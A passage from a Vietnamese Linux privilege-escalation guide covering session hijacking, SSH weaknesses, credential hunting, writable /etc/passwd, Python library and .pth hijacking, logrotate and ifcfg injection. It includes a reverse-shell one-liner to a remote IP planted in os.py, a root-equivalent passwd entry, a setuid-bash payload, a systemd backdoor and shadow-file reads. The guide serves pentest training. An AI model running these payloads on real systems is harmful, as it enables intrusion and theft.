Quyền truy cập GNU Screen giữa các người dùng phụ thuộc vào **cấu hình và ACL của phiên đang chạy**, không chỉ phiên bản. [GNU Screen ghi rõ](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) rằng chương trình phải được build với hỗ trợ multiuser; `multiuser on` cùng với quyền `acladd` hoặc `aclchg` phù hợp cho phép người dùng khác attach. [Tài liệu cũng yêu cầu setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) để tra cứu phiên giữa các người dùng. Chỉ thấy một socket thuộc sở hữu của root hoặc một binary `screen` SUID không đủ để khẳng định có thể attach vào shell root. Hãy xác nhận phiên đang hoạt động bật multiuser, người dùng hiện tại có quyền nhập lệnh/thực thi hiệu lực, và shell trong phiên chạy với quyền của chủ sở hữu có đặc quyền trước khi xem đây là một con đường leo thang đặc quyền.

### screen sessions hijacking

**Liệt kê các phiên screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![chiếm quyền session screen - Vị trí socket (một số hệ thống hiển thị một vị trí dưới dạng symlink của vị trí kia): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Kết nối vào một session**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Hijacking phiên tmux

Đây từng là vấn đề ở **các phiên bản tmux cũ**. Tôi không thể hijack một phiên tmux (v2.1) do root tạo khi sử dụng tài khoản không có đặc quyền.

**Liệt kê các phiên tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Vị trí socket (một số hệ thống cung cấp một socket dưới dạng symlink đến socket còn lại) - chiếm quyền các phiên tmux: tmux -S /tmp/dev sess ls Liệt kê bằng socket đó; bạn có thể khởi chạy một phiên tmux trên socket đó...](<../../images/image (837).png>)

**Kết nối vào một phiên**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Xem **Valentine box from HTB** để tham khảo ví dụ.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Các key được tạo bằng bản dựng OpenSSL bị ảnh hưởng trên Debian hoặc các bản phân phối phái sinh trong giai đoạn từng có lỗ hổng có thể dùng dữ liệu ngẫu nhiên dễ đoán; bản phân phối hiện tại của máy chủ hoặc phiên bản OpenSSL đã vá không cho biết key cũ được tạo như thế nào. Hãy kiểm tra **key cụ thể** bằng blacklist lịch sử phù hợp và xác minh nguồn gốc của key. Tài liệu [`ssh-vulnkey` của Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) hướng dẫn kiểm tra public key và `authorized_keys`; [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) ghi nhận bản sửa OpenSSL. Một mục trong `authorized_keys` của tài khoản đặc quyền chỉ là manh mối leo thang đặc quyền nếu có thể lấy lại private key tương ứng và chính sách SSH có hiệu lực vẫn chấp nhận key đó cho tài khoản ấy; **host key** yếu tự nó không phải thông tin đăng nhập. Hãy thay các key bị xâm phạm và xóa các mục cấp quyền cũ.

### Các giá trị cấu hình SSH đáng chú ý

- **PasswordAuthentication:** Chỉ định có cho phép xác thực bằng password hay không. Giá trị mặc định của OpenSSH upstream là `yes`; cấu hình của bản phân phối có thể ghi đè giá trị này.
- **PubkeyAuthentication:** Chỉ định có cho phép xác thực bằng public key hay không. Giá trị mặc định là `yes`.
- **PermitEmptyPasswords**: Khi cho phép xác thực bằng password, tùy chọn này chỉ định máy chủ có cho phép đăng nhập vào các tài khoản có chuỗi password rỗng hay không. Giá trị mặc định là `no`.

### Các tệp kiểm soát đăng nhập

Các tệp này ảnh hưởng đến việc ai có thể đăng nhập và cách đăng nhập:

- **`/etc/nologin`**: nếu tồn tại, chặn đăng nhập của người dùng không phải root và hiển thị thông báo trong tệp.
- **`/etc/securetty`**: giới hạn nơi root có thể đăng nhập (danh sách TTY được phép).
- **`/etc/motd`**: banner sau khi đăng nhập (có thể làm lộ thông tin môi trường hoặc bảo trì).

### PermitRootLogin

Chỉ định root có thể đăng nhập bằng ssh hay không. Giá trị mặc định của OpenSSH upstream là `prohibit-password`; cấu hình của bản phân phối có thể ghi đè giá trị này. Các giá trị có thể có:

- `yes`: root có thể đăng nhập bằng password và private key
- `without-password` hoặc `prohibit-password`: root chỉ có thể đăng nhập bằng private key
- `forced-commands-only`: Root chỉ có thể đăng nhập bằng private key và khi các tùy chọn commands được chỉ định
- `no` : không cho phép

### Các certificate authority SSH được tin cậy cho người dùng

`TrustedUserCAKeys` chỉ định các public key mà sshd tin cậy để ký certificate **người dùng**. Nếu private CA key tương ứng có thể được người dùng có ít đặc quyền hơn đọc, hãy xem xét ai có thể nhận certificate và certificate đó có thể xác thực với principal của tài khoản nào. `AuthorizedPrincipalsFile` hoặc `AuthorizedPrincipalsCommand` có thể giới hạn các tên được chấp nhận; nếu không cấu hình cả hai, certificate phải chứa tên tài khoản đích. `PermitRootLogin prohibit-password` chặn xác thực root bằng password nhưng vẫn có thể cho phép xác thực bằng certificate. Chỉ riêng đường dẫn key bị lộ không chứng minh có thể truy cập: hãy xác minh cặp public/private key, các quy tắc `Match` có hiệu lực, chính sách tài khoản, passphrase của key, trạng thái thu hồi và các thuật toán chữ ký được chấp nhận. Không đưa nội dung private key vào kết quả liệt kê. Xem [tài liệu cấu hình máy chủ OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Private CA key cũng có thể được sử dụng **mà không cần người dùng hiện tại đọc được key** nếu có quy tắc ủy quyền đặc quyền cho phép người dùng đó gọi một [certificate signer không bị giới hạn như `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) dưới danh tính của chủ sở hữu key. Đối chiếu chính xác lệnh và đối số được phép với quyền truy cập key của tài khoản ký, public CA được cấu hình sshd có hiệu lực tin cậy, principal được chấp nhận cho tài khoản đích, thời hạn hiệu lực của certificate và chính sách đăng nhập của tài khoản đó. Chỉ riêng lệnh signer được ủy quyền hoặc tệp CA được tin cậy không chứng minh có thể truy cập tài khoản khác; không ký certificate thử nghiệm trong quá trình liệt kê thụ động.

### AuthorizedKeysFile

Chỉ định các tệp chứa public key có thể dùng để xác thực người dùng. Tệp có thể chứa các token như `%h`, được thay bằng thư mục home. **Bạn có thể chỉ định đường dẫn tuyệt đối** (bắt đầu bằng `/`) hoặc **đường dẫn tương đối tính từ thư mục home của người dùng**. Ví dụ:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Cấu hình đó cho biết rằng nếu bạn thử đăng nhập bằng khóa **private** của người dùng "**testusername**", ssh sẽ so sánh khóa public của bạn với các khóa nằm trong `/home/testusername/.ssh/authorized_keys` và `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding cho phép bạn **dùng các khóa SSH cục bộ thay vì để các khóa** (không có passphrase!) nằm trên server. Nhờ đó, bạn có thể **dùng ssh để nhảy** **đến một host**, rồi từ đó **nhảy đến một** host **khác bằng** **khóa** nằm trên **host ban đầu** của bạn.

Bạn cần đặt tùy chọn này trong `$HOME/.ssh.config` như sau:

```
Host example.com
  ForwardAgent yes
```

Lưu ý rằng nếu `Host` là `*`, mỗi khi người dùng chuyển sang một máy khác, máy đó sẽ có thể truy cập các key (đây là vấn đề bảo mật).

Tệp `/etc/ssh_config` có thể **ghi đè** các **tùy chọn** này và cho phép hoặc từ chối cấu hình này.\
Tệp `/etc/sshd_config` có thể **cho phép** hoặc **từ chối** SSH agent forwarding bằng từ khóa `AllowAgentForwarding` (mặc định là cho phép).

Nếu phát hiện Forward Agent được cấu hình trong một môi trường, hãy đọc trang sau vì **bạn có thể lợi dụng tính năng này để leo thang đặc quyền**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Các tệp đáng chú ý

### Các tệp profile

Tệp `/etc/profile` và các tệp trong `/etc/profile.d/` là **các script được thực thi khi người dùng mở một shell mới**. Vì vậy, nếu có thể **ghi hoặc sửa đổi bất kỳ tệp nào trong số đó, bạn có thể leo thang đặc quyền**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Nếu tìm thấy bất kỳ script profile lạ nào, bạn nên kiểm tra xem chúng có chứa **thông tin nhạy cảm** hay không.

### Tệp Passwd/Shadow

Tùy thuộc vào hệ điều hành, các tệp `/etc/passwd` và `/etc/shadow` có thể được đặt tên khác hoặc có thể có bản sao lưu. Vì vậy, bạn nên **tìm tất cả các tệp này** và **kiểm tra xem bạn có thể đọc chúng hay không** để xem **bên trong có chứa hash không**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Trong một số trường hợp, bạn có thể tìm thấy **hash mật khẩu** bên trong tệp `/etc/passwd` (hoặc tệp tương đương)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd có thể ghi

Trước tiên, tạo mật khẩu bằng một trong các lệnh sau.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Sau đó, thêm người dùng `hacker` và đặt mật khẩu đã tạo.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Ví dụ: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Giờ bạn có thể dùng lệnh `su` với `hacker:hacker`

Ngoài ra, bạn có thể dùng các dòng sau để thêm một người dùng giả không có mật khẩu.\
CẢNH BÁO: việc này có thể làm giảm mức độ bảo mật hiện tại của máy.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

LƯU Ý: Trên các nền tảng BSD, `/etc/passwd` nằm ở `/etc/pwd.db` và `/etc/master.passwd`; `/etc/shadow` cũng được đổi tên thành `/etc/spwd.db`.

Bạn nên kiểm tra xem mình có thể **ghi vào một số tệp nhạy cảm** hay không. Ví dụ: bạn có thể ghi vào một **tệp cấu hình dịch vụ** nào không?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Ví dụ: nếu máy đang chạy máy chủ **tomcat** và bạn có thể **chỉnh sửa tệp cấu hình dịch vụ Tomcat bên trong /etc/systemd/,** thì bạn có thể chỉnh sửa các dòng:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor của bạn sẽ được thực thi vào lần tiếp theo tomcat được khởi động.

### Kiểm tra thư mục

Các thư mục sau có thể chứa bản sao lưu hoặc thông tin đáng chú ý: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Có lẽ bạn sẽ không thể đọc thư mục cuối cùng, nhưng hãy thử)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Vị trí bất thường/Tệp thuộc sở hữu

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Các tệp đã chỉnh sửa trong vài phút gần đây

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Tệp DB SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Với các database ứng dụng có thể đọc được, hãy kiểm tra tên bảng và cột để tìm username và password hash. Việc tìm thấy một hash, khôi phục mật khẩu từ hash đó và chứng minh mật khẩu được dùng lại cho tài khoản cục bộ là các bước riêng biệt; chỉ riêng một chuỗi hexadecimal gồm 32 ký tự không đủ để kết luận đó là MD5 hoặc có quyền truy cập tài khoản.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Nếu lịch sử shell đọc được chứa lệnh `sudo` theo sau là một dòng ngắn trông giống mật khẩu, hãy tự kiểm tra các dòng xung quanh. Mật khẩu được nhập vào lời nhắc `sudo` thông thường không được lưu trong lịch sử shell; dòng tiếp theo chỉ có thể là nội dung vô tình được nhập vào shell, không phải bằng chứng cho thấy đó là mật khẩu hợp lệ. Dấu đánh dấu `.sudo_as_admin_successful` ghi nhận lần sử dụng trước đó, chứ không cho biết quyền hiện tại.

### Tệp ẩn

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Binaries trong PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Các tệp web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Bản sao lưu**

Kiểm tra các tệp có thể đọc được bên trong thư mục sao lưu, cũng như các tệp có **tên** chứa `backup`: archive có tên khó hiểu hoặc phần mở rộng được mã hóa vẫn có thể làm lộ dữ liệu ứng dụng cũ. Archive được mã hóa chỉ là một dấu hiệu có thể bị lộ. Khôi phục mật khẩu, kiểm tra nội dung, khôi phục hash ứng dụng và dùng lại mật khẩu đó cho tài khoản Unix là các bước riêng biệt cần xác minh; hash trong archive không chứng minh rằng có thể đăng nhập cục bộ.

Các bản sao lưu máy ảo có thể đọc được cũng cần được kiểm tra tương tự. Cấu hình VirtualBox `.vbox` có thể xác định các image `.vdi` được đính kèm và chứa metadata về khóa đĩa được mã hóa; [VirtualBox ghi rõ khóa dữ liệu được mã hóa được lưu trong cấu hình VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Cần truy cập được cả cấu hình lẫn image thì mới có thể kiểm tra đĩa offline. Volume của máy khách có thể có lớp mã hóa [LUKS riêng](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), cần một khóa riêng. Ngay cả sau khi giải mã được cấp phép, script hoặc cấu hình cũ vẫn có thể chứa mật khẩu; hãy xác minh thông tin xác thực đó còn dùng được cho tài khoản trên host và chính sách `sudo` hiệu lực của tài khoản cho phép chạy lệnh có đặc quyền trước khi coi đây là một trường hợp leo thang đặc quyền cục bộ. Trong quá trình liệt kê thụ động, chỉ ghi nhận đường dẫn và quyền truy cập; không sao chép, giải mã hoặc mount image.

Khi kiểm tra archive có thể đọc được, hãy liệt kê tên các thành viên trước khi giải nén: các tệp xác thực ẩn, dữ liệu mã khôi phục hoặc SSH key có thể hiện diện ngay cả khi các bản sao đang hoạt động được bảo vệ. Tên tệp chỉ là manh mối; hãy xác minh riêng dữ liệu đó và việc có dùng lại thông tin xác thực hay không.

Ưu tiên các **archive có thể đọc được nhưng thuộc sở hữu của người dùng khác** trong thư mục sao lưu, đặc biệt là archive thuộc sở hữu của root và archive có thể truy cập thông qua tư cách thành viên nhóm. Archive cũ có thể chứa cấu hình hoặc bí mật xác thực ngay cả khi bản sao đang hoạt động được bảo vệ. Với giao diện sao lưu cục bộ như [Backrest](https://garethgeorge.github.io/backrest/), hãy kiểm tra tài khoản hiệu lực của dịch vụ và liệu người dùng có đặc quyền thấp hơn có thể đọc cấu hình hoặc xác thực với UI hay không. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) và [giao diện lệnh restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) có thể hoạt động với quyền truy cập tệp và lệnh của daemon; chỉ riêng việc listener loopback đang lắng nghe không quyết định mức độ ảnh hưởng. `passwordBcrypt` của Backrest là hash bcrypt được mã hóa base64 trong [mã xác thực](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), không phải mật khẩu dạng rõ. Hãy xác nhận danh tính dịch vụ, thông tin xác thực có thể sử dụng và quyền truy cập vào plan hoặc repository liên quan trước khi coi archive hoặc UI bị lộ là ranh giới đặc quyền.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Các tệp đã biết có chứa mật khẩu

Đọc mã nguồn của [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); công cụ này tìm kiếm **một số tệp có khả năng chứa mật khẩu**.\
**Một công cụ thú vị khác** bạn có thể dùng là [**LaZagne**](https://github.com/AlessandroZ/LaZagne), một ứng dụng mã nguồn mở dùng để truy xuất nhiều mật khẩu được lưu trên máy tính cục bộ chạy Windows, Linux và Mac.

Nếu có thể đọc `/etc/guacamole/guacamole.properties`, hãy kiểm tra các thiết lập kết nối cơ sở dữ liệu `mysql-*`, `postgresql-*` hoặc `sqlserver-*`. Nếu tài khoản được phép đọc các bảng JDBC của Guacamole, `guacamole_connection_parameter` có thể chứa các giá trị `username`, `password`, `private-key` hoặc `passphrase` SSH đã lưu. Hãy bắt đầu bằng cách xem ID kết nối và tên tham số, sau đó chỉ kiểm tra các hàng liên quan; giá trị đã lưu có thể là token động hoặc tham chiếu đến vault, chứ không phải bí mật có thể tái sử dụng. Xem [lược đồ JDBC của Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) và [các tham số kết nối SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Trình quản lý mật khẩu [pswm](https://github.com/Julynx/pswm#usage) lưu vault được mã hóa theo mặc định tại `~/.local/share/pswm/pswm`. Nếu có thể thấy vault của người dùng khác, hãy kiểm tra quyền sở hữu và liệu tài khoản của bạn có thực sự đọc được vault đó hay không. Chỉ riêng đường dẫn vault không tiết lộ thông tin xác thực; khôi phục mật khẩu chính, tìm mật khẩu tài khoản có thể tái sử dụng và xác nhận đặc quyền của tài khoản đó là những bước riêng biệt.

[Thư mục cơ sở dữ liệu mặc định của Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) là `~/.passpie/`, chứa một keyring `.keys` và các tệp thông tin xác thực `.pass` được mã hóa trong các thư mục nhóm. Chỉ nhìn thấy thư mục cơ sở dữ liệu mới cho biết vị trí cần kiểm tra; hãy xác nhận quyền truy cập vào khóa và mục được mã hóa liên quan, mọi master passphrase bắt buộc, cũng như liệu thông tin xác thực khôi phục được có thuộc về tài khoản có đặc quyền cao hơn hay không. Passpie cũng hỗ trợ [đường dẫn cơ sở dữ liệu tùy chỉnh](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), vì vậy đường dẫn mặc định không bao quát mọi trường hợp. Việc liệt kê tự động nên chỉ hiển thị metadata, không xuất thông tin xác thực hoặc in ra dữ liệu khóa.

### Log

Nếu có thể đọc log, bạn có thể tìm thấy **thông tin đáng chú ý/riêng tư bên trong**. Log càng bất thường thì càng đáng chú ý (có lẽ vậy).\
Ngoài ra, một số **audit log** được cấu hình “tệ” (có backdoor?) có thể cho phép bạn **ghi lại mật khẩu** trong audit log như được giải thích trong bài viết này: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Để đọc log, nhóm [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sẽ rất hữu ích.

### Các tệp shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Tìm kiếm/Regex Creds tổng quát

Bạn cũng nên kiểm tra các file có từ "**mật khẩu**" trong **tên** hoặc trong **nội dung**, đồng thời kiểm tra IP và email trong log, hoặc các regex hash.\
Tôi sẽ không liệt kê ở đây cách thực hiện tất cả những việc này, nhưng nếu quan tâm, bạn có thể xem các bước kiểm tra cuối cùng mà [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) thực hiện.

## File có quyền ghi

### Python library hijacking

Nếu bạn biết script python sẽ được thực thi **từ đâu** và **có thể ghi vào** thư mục đó hoặc **có thể chỉnh sửa các thư viện python**, bạn có thể chỉnh sửa thư viện OS và cài backdoor vào đó (nếu có thể ghi vào nơi script python được thực thi, hãy sao chép và dán thư viện os.py).

Để **cài backdoor vào thư viện**, chỉ cần thêm dòng sau vào cuối thư viện os.py (thay đổi IP và PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` có quyền ghi được xử lý bởi `site.addsitedir()`

Đừng xem `site.addsitedir(DIR)` tương đương với `sys.path.append(DIR)`. Hàm này còn xử lý mọi tệp `*.pth` trong `DIR`. Dòng bắt đầu bằng `import`, theo sau là dấu cách hoặc tab, sẽ được thực thi dưới dạng mã Python. Các dòng chứa đường dẫn thì được phân giải tương đối với thư mục site và chỉ được thêm vào nếu đường dẫn đó tồn tại.<sup>[[38]](#references)</sup>

Điều này dẫn đến leo thang đặc quyền khi một chương trình Python được phép chạy bằng sudo hoặc có đặc quyền theo cách khác gọi `site.addsitedir()` với một thư mục mà người dùng hiện tại hoặc một nhóm của họ có quyền ghi. Mã trong tệp `.pth` chạy khi chương trình có đặc quyền đang thiết lập đường dẫn import, trước khi thực hiện hành động thông thường.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Nội dung thực thi trong `.pth` phải nằm trên một dòng, nhưng dấu chấm phẩy cho phép dùng nhiều câu lệnh. Ví dụ, một đường dẫn thực thi với quyền root có thể tạo bản sao Bash setuid; gọi Bash với `-p` để giữ nguyên ID hiệu lực của nó.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Tùy chọn `-S` chỉ tắt khởi tạo `site` tự động của Python. Tùy chọn này không bảo vệ chương trình chủ động import `site` rồi gọi `site.addsitedir()`. Hãy loại bỏ các thư mục mà kẻ tấn công có thể ghi khỏi đường dẫn import có đặc quyền, đồng thời yêu cầu thư mục và các tệp `.pth` của nó chỉ thuộc sở hữu và chỉ có thể được ghi bởi quản trị viên có đặc quyền.<sup>[[38]](#references)[[39]](#references)</sup>

### Khai thác logrotate

Một tác vụ `logrotate` có đặc quyền có thể tạo ra đường ghi tệp xuyên người dùng nếu tác vụ thực sự xoay vòng một log nằm dưới thư mục mà người dùng ít đặc quyền hơn có thể thay thế hoặc chuyển hướng trong lúc xoay vòng. Chỉ riêng việc log có thể ghi được mới chỉ là dấu hiệu cần kiểm tra. Hãy xác nhận quy tắc đang hoạt động chính xác cùng các chỉ thị `create`, `olddir` và `su`; danh tính thực tế của bộ lập lịch; quyền ghi và tìm kiếm trên thư mục cha của log; và liệu bản dựng cùng chính sách đã cài đặt có cho phép thay đổi đích hay không. Một shell có đặc quyền được mở sau đó cũng phải tải tệp vừa tạo thì việc ghi vào tệp khởi động mới dẫn đến thực thi lệnh. Kiểm tra lịch chạy, quy tắc, phiên bản/cách đóng gói và metadata của đường dẫn mà không kích hoạt xoay vòng hay thử race.

> [!TIP]
> Không coi `3.18.0` hay bất kỳ chuỗi phiên bản nào là ngưỡng duy nhất để xác định khả năng khai thác. [Change log của upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) ghi nhận các biện pháp hardening thư mục và symlink trong nhiều bản phát hành, và các bản phân phối có thể backport bản sửa lỗi. [Tài liệu hướng dẫn của upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) khuyến nghị dùng `su` khi root xoay vòng log trong các thư mục do người dùng không có đặc quyền kiểm soát; hãy xác minh quy tắc đang có hiệu lực và hành vi thực tế.

Thông tin chi tiết hơn về lỗ hổng có thể tìm thấy tại trang này: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Bạn có thể khai thác lỗ hổng này bằng [**logrotten**](https://github.com/whotwagner/logrotten).

Lỗ hổng này rất giống [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(log nginx),** vì vậy, bất cứ khi nào phát hiện có thể chỉnh sửa log, hãy kiểm tra ai đang quản lý các log đó và liệu có thể leo thang đặc quyền bằng cách thay log bằng symlink hay không.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Tham chiếu lỗ hổng:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Tệp `ifcfg-*` là một dấu hiệu cần kiểm tra khi người dùng ít đặc quyền hơn có thể tạo hoặc chỉnh sửa tệp đó **và** một đường kích hoạt mạng có đặc quyền sẽ đọc chính xác tệp đó. Hãy xác nhận quyền hiệu lực trên tệp và thư mục, giao diện được chọn, cách triển khai `ifup`/`ifdown` đã cài đặt và người gọi chúng. Chỉ riêng việc tệp có thể ghi được không gây ra thực thi. [Hướng dẫn mạng RHEL 7 của Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) phân biệt các network script cũ với NetworkManager: bản thân NetworkManager không kích hoạt các script cũ. [Tài liệu RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) nêu rằng `ifup`/`ifdown` mặc định của phiên bản này sử dụng NetworkManager, còn gói legacy tùy chọn cung cấp các shell script.

Trên hệ thống thực sự dùng các script legacy có đặc quyền, một phép gán `ifcfg-*` không được trích dẫn và được nạp bằng shell, chẳng hạn `NAME=`, có thể vượt qua ranh giới thực thi mã. Hãy xác minh parser, giá trị và đường kích hoạt chính xác; đừng suy luận rằng shell sẽ diễn giải tệp chỉ dựa trên tên tệp hoặc sự hiện diện của NetworkManager. Một wrapper được phép chạy bằng sudo, ghi đầu vào của người gọi vào tệp `ifcfg-*` rồi gọi `ifup` legacy, là một đường riêng dẫn đến ranh giới này ngay cả khi người gọi không thể trực tiếp chỉnh sửa tệp.

Ví dụ: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Lưu ý khoảng trắng giữa Network và /bin/id_)

### **init, init.d, systemd, và rc.d**

